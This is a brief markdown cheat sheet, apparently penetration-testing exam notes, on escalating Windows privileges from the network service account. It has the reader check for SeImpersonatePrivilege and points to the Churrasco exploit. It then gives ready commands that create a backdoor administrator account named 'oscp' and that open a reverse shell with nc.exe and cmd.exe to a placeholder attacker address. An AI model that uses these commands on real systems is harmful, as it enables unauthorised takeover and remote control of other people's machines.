### Privilage escalation for *nt authority\network service*
```
c:> whoami
whoami
nt authority\network service
```
### Check /priv
```
c:> whoami /priv
whoami /priv

check for SeImpersonatePrivilage is Enabled
```

### Upload *churrasco.exe*
- https://github.com/Re4son/Churrasco

### Use *add user to localgroup Administrator*
```
churrasco.bin "net user oscp oscp /add && net localgroup Administrators oscp /add"
```

### Use *nc connection*
```
churrasco.exe "nc.exe <your_machine_ip> <your_machine_port> -e cmd.exe"
```
